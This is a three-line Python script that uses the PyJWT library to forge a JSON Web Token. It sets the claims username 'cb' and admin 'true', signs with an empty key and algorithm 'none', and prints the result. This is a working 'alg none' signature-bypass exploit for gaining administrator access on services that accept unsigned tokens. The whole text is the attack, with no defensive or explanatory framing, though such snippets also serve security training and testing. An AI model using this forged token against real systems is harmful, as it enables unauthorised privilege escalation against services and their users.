import jwt
encoded = jwt.encode({'username':'cb','admin':'true'},'',algorithm='none')
print(encoded)